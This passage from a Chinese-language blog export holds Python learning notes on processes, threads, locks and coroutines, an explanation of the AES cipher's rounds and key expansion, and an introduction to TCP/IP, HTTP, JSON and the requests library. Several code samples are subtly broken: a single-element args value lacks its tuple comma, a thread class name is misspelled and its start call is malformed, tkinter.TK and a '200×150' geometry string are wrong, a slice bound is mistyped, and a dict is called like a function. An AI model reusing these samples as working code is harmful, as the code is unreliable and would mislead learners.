class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>上面通过Process类创建了进程对象，通过target参数传入一个函数表示进程启动后要执行的代码，后面args是一个元祖，代表传递给函数的参数。Process和start方法用来启动进程，而join方法表示等待进程执行结束。两个任务同时启动了。</p>
<p>也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通讯</p>
<h2 id="Python中的多线程"><a href="#Python中的多线程" class="headerlink" title="Python中的多线程"></a>Python中的多线程</h2><p>Python通过thread模块（现在名为_thread）来实现多线程编程，该模块过于底层，而且很多功能都没有提供，推荐threading模块，该模块对多线程编程提供了更好的面对对象的封装。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    t1 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    t1.<span class="built_in">start</span>()</span><br><span class="line">    t2 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>,))</span><br><span class="line">    t2.<span class="built_in">start</span>()</span><br><span class="line">    t1.<span class="built_in">join</span>()</span><br><span class="line">    t2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.3f秒&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>直接使用threading模块的Thread类来创建进程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建类，因此可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。<br><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="title">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="title">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">DownloadTask</span>(<span class="type">Thread</span>):</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">filename</span>):</span></span><br><span class="line"><span class="class">        super().__init__()</span></span><br><span class="line"><span class="class">        self._filename = filename</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        print(&#x27;开始下载%<span class="title">s</span>...&#x27; % <span class="title">self</span>.<span class="title">_filename</span>)</span></span><br><span class="line"><span class="class">        time_to_download = randint(5,10)</span></span><br><span class="line"><span class="class">        sleep(<span class="title">time_to_download</span>)</span></span><br><span class="line"><span class="class">        print(&#x27;%<span class="title">s</span>下载完成！耗费%<span class="title">d</span>秒&#x27; % (<span class="title">self</span>.<span class="title">_filename</span>,<span class="title">time_to_download</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def main():</span></span><br><span class="line"><span class="class">    start = time()</span></span><br><span class="line"><span class="class">    t1 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Python</span>从入门到住院.<span class="title">pdf&#x27;</span>)</span></span><br><span class="line"><span class="class">    t1.start()</span></span><br><span class="line"><span class="class">    t2 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Peking</span> <span class="type">Hot</span>.<span class="title">avi&#x27;</span>)</span></span><br><span class="line"><span class="class">    t2.start()</span></span><br><span class="line"><span class="class">    t1.join()</span></span><br><span class="line"><span class="class">    t2.join()</span></span><br><span class="line"><span class="class">    end = time()</span></span><br><span class="line"><span class="class">    print(&#x27;总共耗费了%.2<span class="title">f</span>秒&#x27; % (<span class="title">end</span>-<span class="title">start</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="class">    main()</span></span><br></pre></td></tr></table></figure><br>多个线程可以共享进程的内存空间，要实现多个线程间的通信相对简单，设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（称之为资源）的时候，很有可能产生不可控的结果导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”状态。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Account</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._balance = <span class="number">0</span></span><br><span class="line">        self._lock = Lock() <span class="comment">#加锁保护对银行账户的操作</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">self,money</span>):</span></span><br><span class="line">        self._lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 计算存款后的余额</span></span><br><span class="line">            new_balance = self._balance + money</span><br><span class="line">            <span class="comment"># 模拟受理存款业务需要0.01秒的时间</span></span><br><span class="line">            sleep(<span class="number">0.01</span>)</span><br><span class="line">            <span class="comment"># 修改账户余额</span></span><br><span class="line">            self._balance = new_balance</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># 在finally中执行释放锁的操作保证正常异常锁都能释放</span></span><br><span class="line">            self._lock.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">balance</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._balance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddMoneyThread</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,account,money</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self._account = account</span><br><span class="line">        self._money = money</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._account.deposit(self._money)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    account = Account()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="comment"># 创建100个存款的线程向同一个账户存钱</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        t = AddMoneyThread(account,<span class="number">1</span>)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="comment"># 等所有存款的线程都执行完毕</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;账户余额为：￥%d元&#x27;</span> % account.balance)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h2 id="多进程还是多线程"><a href="#多进程还是多线程" class="headerlink" title="多进程还是多线程"></a>多进程还是多线程</h2><p>无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。</p>
<p>但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。</p>
<p>是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到了Python中有嵌入C/C++代码的机制。</p>
<p>除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。</p>
<h2 id="单线程-异步I-O"><a href="#单线程-异步I-O" class="headerlink" title="单线程+异步I/O"></a>单线程+异步I/O</h2><p>现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。</p>
<p>在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p>
<h3 id="例1：将耗时间的任务放到线程中以获得更好的用户体验"><a href="#例1：将耗时间的任务放到线程中以获得更好的用户体验" class="headerlink" title="例1：将耗时间的任务放到线程中以获得更好的用户体验"></a>例1：将耗时间的任务放到线程中以获得更好的用户体验</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import <span class="selector-tag">time</span></span><br><span class="line">import tkinter</span><br><span class="line">import tkinter<span class="selector-class">.messagebox</span></span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    class <span class="built_in">DownloadTaskHandler</span>(Thread):</span><br><span class="line">        def <span class="built_in">run</span>(self):</span><br><span class="line">            time.<span class="built_in">sleep</span>(<span class="number">10</span>)</span><br><span class="line">            tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;提示&#x27;</span>,<span class="string">&#x27;下载完成！&#x27;</span>)</span><br><span class="line">            # 启用下载按钮</span><br><span class="line">            button1.<span class="built_in">config</span>(state = tkinter.NORMAL)</span><br><span class="line">    def <span class="built_in">download</span>():</span><br><span class="line">        # 禁用下载按钮</span><br><span class="line">        button1.<span class="built_in">config</span>(state = tkinter.DISABLED)</span><br><span class="line">        # 通过daemon参数将参数设置为守护线程（主程序退出就不再保留执行）</span><br><span class="line">        # 在线程中处理耗时间的下载任务</span><br><span class="line">        <span class="built_in">DownLoadTaskHandler</span>(daemon=True.<span class="built_in">start</span>())</span><br><span class="line">    def <span class="built_in">show_about</span>():</span><br><span class="line">        tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;关于&#x27;</span>,<span class="string">&#x27;作者：张三&#x27;</span>)</span><br><span class="line">    top = tkinter.<span class="built_in">TK</span>()</span><br><span class="line">    top.<span class="built_in">title</span>(<span class="string">&#x27;单线程&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">geometry</span>(<span class="string">&#x27;200×150&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">wm_attributes</span>(<span class="string">&#x27;-topmost&#x27;</span>,True)</span><br><span class="line">    panel = tkinter.<span class="built_in">Frame</span>(top)</span><br><span class="line">    button1 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;下载&#x27;</span>,command=download)</span><br><span class="line">    button1.<span class="built_in">pack</span>(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    button2 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;关于&#x27;</span>,command=show_about)</span><br><span class="line">    button2.<span class="built_in">pack</span>(side=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    panel.<span class="built_in">pack</span>(side=<span class="string">&#x27;bottom&#x27;</span>)</span><br><span class="line">    tkinter.<span class="built_in">mainloop</span>()</span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="例2：使用多进程对复杂任务进行“分而治之”"><a href="#例2：使用多进程对复杂任务进行“分而治之”" class="headerlink" title="例2：使用多进程对复杂任务进行“分而治之”"></a>例2：使用多进程对复杂任务进行“分而治之”</h3><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">from</span> multiprocessing import Process,Queue</span><br><span class="line"><span class="meta">from</span> random import randint</span><br><span class="line"><span class="meta">from</span> time import time</span><br><span class="line"></span><br><span class="line">def task_handler(curr_list,result_queue):</span><br><span class="line">    total = 0</span><br><span class="line">    for number <span class="meta">in</span> curr_list:</span><br><span class="line">        total += number</span><br><span class="line">    result_queue<span class="meta">.put(</span>total)</span><br><span class="line">def ma<span class="meta">in(</span>):</span><br><span class="line">    processes = []</span><br><span class="line">    number_lisst = [<span class="meta">x</span> for <span class="meta">x</span> <span class="meta">in</span><span class="meta"> range(</span>1,100000001)]</span><br><span class="line">    result_queue = Queue()</span><br><span class="line">    <span class="meta">index</span> = 0</span><br><span class="line">    # 启动8个进程将数据切片后进行运算</span><br><span class="line">    for _ <span class="meta">in</span><span class="meta"> range(</span>8):</span><br><span class="line">        p = Process(target=task_handler,args=(number_lisst[<span class="meta">index</span>:<span class="meta">index</span>+122500000],result_queue))</span><br><span class="line">        <span class="meta">index</span> += 12500000</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    # 开始记录所有进程执行完成花费的时间</span><br><span class="line">    start =<span class="meta"> time(</span>)</span><br><span class="line">    for p <span class="meta">in</span> processes:</span><br><span class="line">        p.jo<span class="meta">in(</span>)</span><br><span class="line">    # 合并执行结果</span><br><span class="line">    total = 0</span><br><span class="line">    <span class="meta">while</span> <span class="meta">not</span> result_queue.empty():</span><br><span class="line">        total += result_queue.get()</span><br><span class="line">    p<span class="meta">rint(</span>total)</span><br><span class="line">    <span class="meta">end</span> =<span class="meta"> time(</span>)</span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;Execution time:&#x27;</span>,(<span class="meta">end</span>-start),<span class="string">&#x27;s&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ma<span class="meta">in(</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Python-100days</tag>
      </tags>
  </entry>
  <entry>
    <title>AES算法</title>
    <url>/2020/03/22/AES%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h3 id="本文为AES算法的原理详解。"><a href="#本文为AES算法的原理详解。" class="headerlink" title="本文为AES算法的原理详解。"></a>本文为AES算法的原理详解。</h3><span id="more"></span>
<h2 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h2><p>AES算法是迭代型分组密码算法</p>
<h4 id="基本参数："><a href="#基本参数：" class="headerlink" title="基本参数："></a>基本参数：</h4><ul>
<li>分组长度：128比特</li>
<li>密钥长度：128、192或256比特</li>
<li>圈数：10、12或14圈，与密钥长度相对应。<br><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/01.png" alt="0e3a70192e194b783ac4ce688cae36bb.png"></li>
</ul>
<p>前9次加密过程除了密钥都一样，最后一次加密过程没有列混淆。</p>
<h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><h4 id="字节代替变换-S盒"><a href="#字节代替变换-S盒" class="headerlink" title="字节代替变换(S盒)"></a>字节代替变换(S盒)</h4><p>字节代替变换时关于字节的非线性变换，它将字节矩阵中每一个字节利用同一个S盒变换为另一个字节。变换后位置不变。</p>
<p>由两个可逆变换复合而成。</p>
<ul>
<li>将每一个字节变换为它在有限域GF(2^8)中的乘法逆。并规定0变换到其自身。</li>
<li>对上一步骤的变换结果用二元域上的一个仿射变换作用。<br>S盒</li>
</ul>
<p>也可以直接按照s盒的表进行替换<br><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/02.png" alt="daedb9641b23bd557f9c88801265bba9.png"><br><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/03.png" alt="86fe95a3443cf677cd411272a670467b.png"></p>
<p>S和S-1分别为16x16的矩阵，完成一个8比特输入到8比特输出的映射，输入的高4-bit对应的值作为行标，低4-bit对应的值作为列标。假设输入字节的值为a=a7a6a5a4a3a2a1a0，则输出值为S[a7a6a5a4][a3a2a1a0]，S-1的变换也同理。</p>
<h4 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h4><p>如果将一个字节矩阵的行从上到下分别称为第0，1，2，3行，则行移位变换的作用就是将这个字节矩阵的第i行循环移位左移i个字节。<br><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/04.png" alt="cd416635aa2f10677a8033eea21cb1a9.png"></p>
<h4 id="列混合变换"><a href="#列混合变换" class="headerlink" title="列混合变换"></a>列混合变换</h4><p>列混合变换对一个字节矩阵逐列进行变换<img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/05.png" alt="affc4a23e5dc09d1200a8036cc65c23e.png"></p>
<p><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/06.png" alt="303b72e95c24fbe9dfaa32d71bb6f51f.png"></p>
<h4 id="圈密钥加"><a href="#圈密钥加" class="headerlink" title="圈密钥加"></a>圈密钥加</h4><p>圈密钥是通过密钥生成算法从初始密钥中产生，其长度等于分组长度。</p>
<p><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/07.png" alt="b2ed713bb65a9a284d605200ae187a11.png"></p>
<h4 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h4><p>AES算法的圈密钥长度等于分组长度128比特，即4个32位字，若迭代圈数为Nr，则连同入口密钥，共需4(Nr+1)个32位字的密钥。</p>
<p><img src="/2020/03/22/AES%E7%AE%97%E6%B3%95/08.png" alt="a7275851176f61b27426a798a083a0ed.png"><br>密钥扩展说明：</p>
<ul>
<li><p>将种子密钥按图(a)的格式排列，其中k0、k1、……、k15依次表示种子密钥的一个字<br>节；排列后用4个32比特的字表示，分别记为w[0]、w[1]、w[2]、w[3]；　　　　</p>
</li>
<li><p>按照如下方式，依次求解w[j]，其中j是整数并且属于[4,43]；　　　　</p>
</li>
<li>若j%4=0,则w[j]=w[j-4]⊕g(w[j-1]),否则w[j]=w[j-4]⊕w[j-1]；　　函数g的流程说明：　　　　<ul>
<li>将w循环左移8比特；　　　　</li>
<li>分别对每个字节做S盒置换；　　　　</li>
<li>32比特的常量（RC[j/4],0,0,0）进行异或，RC是一个一维数组，其值如下。（RC的值只需要有10个，而此处用了11个，实际上RC[0]在运算中没有用到，增加RC[0]是为了便于程序中用数组表示。由于j的最小取值是4，j/4的最小取值则是1，因此不会产生错误。）</li>
</ul>
</li>
</ul>
<p>RC = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36}</p>
<p>参考：<br><a href="https://www.cnblogs.com/luop/p/4334160.html">https://www.cnblogs.com/luop/p/4334160.html</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>14.网络编程入门</title>
    <url>/2020/02/18/14-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h2><h3 id="TCP-IP模型"><a href="#TCP-IP模型" class="headerlink" title="TCP/IP模型"></a>TCP/IP模型</h3><p>实现网络通信的基础是网络通信协议，这些协议通常是由互联网工程任务组（IETF）制定的。所谓“协议”就是通信计算机双方必须共同遵从的一组约定，例如怎样建立连接，怎样相互识别等，网络协议的三要素是：语法、语义和时序。构成我们今天使用的Inter的基础的是TCP/IP协议族，协议族就是一系列的协议及其构成的通信模型，也把这套东西称为TCP/IP模型。与国际标准化组织发布的OSI/RM这个七层模型不同，TCP/IP是一个四层模型，自顶向上依次是：网络接口层、网络层、传输层和应用层。如下图所示。<br><span id="more"></span></p>
<p><img src="/2020/02/18/14-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/TCP-IP-model.png" alt></p>
<p>IP通常被翻译为网际协议，它服务于网络层，主要实现了寻址和路由的功能。接入网络的每一台主机都需要有自己的IP地址，IP地址就是主机在计算机网络上的身份标识。当然由于IPv4地址的匮乏，我们平常在家里、办公室以及其他可以接入网络的公共区域上网时获得的IP地址并不是全球唯一的IP地址，而是一个区域网中的内部IP地址，通过网络地址转换服务我们也可以实现对网络的访问。计算机网络上有大量的我们称为“路由器”的网络中继设备，它们会存储转发我们发送到网络上的数据分组，让从源头发出的数据最终能够找到传送目的的地通路，这项功能就是所谓的路由。</p>
<p>TCP全称传输控制协议，它是基于IP提供的寻址和路由器服务而建立起来的负责实现端到端可靠传输的协议，之所以将TCP称为可靠的传输协议是因为TCP想调用者承诺了三件事情：</p>
<ul>
<li>数据不传丢不传错（利用握手、校验和重传机制可以实现）。</li>
<li>流量控制（通过滑动窗口匹配数据发送者和接收着之间的传输速度）。</li>
<li>拥塞控制（通过RTT时间以及对滑动窗口的控制缓解网络拥堵）。</li>
</ul>
<h3 id="网络应用模式"><a href="#网络应用模式" class="headerlink" title="网络应用模式"></a>网络应用模式</h3><ol>
<li>C/S模式和B/S模式。C指Client（客户端），通常是一个需要安装到某个宿主操作系统上的应用程序；B指Brower（浏览器），它几乎是所有图形化操作系统都默认安装了的一个应用软件；通过C或B都可以实现对S（服务器）的访问。</li>
<li>去中心化的网络应用模式。不管是B/S还是C/S都需要服务器的存在，服务器就是整个应用模式的中心，而去中心化的网络应用通常没有固定的服务器或者固定的客户端，所有应用的使用者既可以作为资源的提供者也可以作为资源的访问者。</li>
</ol>
<h2 id="基于HTTP协议的网络资源的访问"><a href="#基于HTTP协议的网络资源的访问" class="headerlink" title="基于HTTP协议的网络资源的访问"></a>基于HTTP协议的网络资源的访问</h2><h3 id="HTTP（超文本传输协议）"><a href="#HTTP（超文本传输协议）" class="headerlink" title="HTTP（超文本传输协议）"></a>HTTP（超文本传输协议）</h3><p>HTTP是超文本传输协议（Hyper-Text Transfer Proctol）的简称。维基百科解释为：超文本协议是一种用于分布式、协作式和超媒体信息系统的应用层协议，它是万维网数据通信的基础，设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法，通过HTTP或者HTTPS（超文本传输安全协议）请求的资源由URI（统一资源标识符）来标识。阮一峰老师的<a href="http://www.ruanyifeng.com/blog/2016/08/http.html">《HTTP协议入门》</a></p>
<h3 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h3><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换语言，该语言以易于阅读的文字（纯文本）为基础，用来传输由属性值或者序列性的值组成的数据对象。尽管JSON是最初只是JavaScript中一种创建对象的字面量语法，但它在当下更是一种独立于语言的数据格式，很多编程语言都支持JSON格式数据的生成和解析，Python内置的json模块也提供了这方面功能。由于JSON是纯文本，它和XML一样都适用于异构系统之间的数据交换，而相较于XML，JSON显得更加的轻便和优雅。下面是表达同样信息的XML和JSON，而JSON的优势是相当直观的。</p>
<p>XML的例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">content</span>&gt;</span>Will you marry me?<span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>JSON的例子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;from&quot;</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;to&quot;</span>: <span class="string">&quot;Bob&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;content&quot;</span>: <span class="string">&quot;Will you marry me?&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h3><p>requests是一个基于HTTP协议来使用网络的第三库，其官方网站有这样的一句介绍它的话：“Requests是唯一的一个非转基因的Python HTTP库，人类可以安全享用。”简单的说，使用requests库可以非常方便的使用HTTP，避免安全缺陷、冗余代码以及“重复发明轮子”（行业黑话，通常用在软件工程领域表示重新创造一个已有的或是早已被优化過的基本方法）。前面的文章中我们已经使用过这个库，下面我们还是通过requests来实现一个访问网络数据接口并从中获取美女图片下载链接然后下载美女图片到本地的例子程序，程序中使用了天行数据提供的网络API。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span>  Thread</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承Thread类创建自定义的线程类：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DownloadHanlder</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.url = url</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        filename = self.url[self.url.rfind(<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>:]</span><br><span class="line">        resp = requests.get(self.url)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/Hao&#x27;</span> + filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(resp.content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 通过requests模块的get函数获取网络资源</span></span><br><span class="line">    <span class="comment"># 下面的代码中使用了天行数据借口提供的网络API</span></span><br><span class="line">    <span class="comment"># 要使用该数据借口需要在天行数据的网站上注册</span></span><br><span class="line">    <span class="comment"># 然后用自己的Key替换掉下面代码中APIKey即可</span></span><br><span class="line">    resp = requests.get(<span class="string">&#x27;http://api.tinanapi.com/meinv/?key=APIKey&amp;num=10&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将服务器返回的JSON格式的数据解析为字典</span></span><br><span class="line">    data_model = resp.json()</span><br><span class="line">    <span class="keyword">for</span> mm_dict <span class="keyword">in</span> data_model[<span class="string">&#x27;newslist&#x27;</span>]:</span><br><span class="line">        url = mm_dict(<span class="string">&#x27;picUrl&#x27;</span>)</span><br><span class="line">        <span class="comment"># 通过多线程的方式实现图片下载</span></span><br><span class="line">        DownloadHanlder(url).start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
